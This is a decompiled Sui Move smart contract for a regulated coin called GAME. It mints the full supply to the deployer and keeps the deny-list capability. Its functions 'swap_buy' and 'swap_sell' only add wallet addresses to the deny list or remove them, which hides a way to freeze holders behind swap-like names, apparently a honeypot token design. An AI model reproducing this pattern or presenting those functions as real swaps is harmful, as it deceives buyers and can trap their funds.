module 0x4f8b87fa4de10d36dc40d3a5715604f846762efadebf34ed9e20e38e0111727b::game {
    struct GAME has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GAME, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GAME>(arg0, 9, b"GAME", b"Game is game", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmcwvRBrHrGT659gURFQPJZbh1rA7usWRhLrvtrk78sw7S"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GAME>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GAME>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GAME>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GAME>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GAME>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GAME>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GAME>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<GAME>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

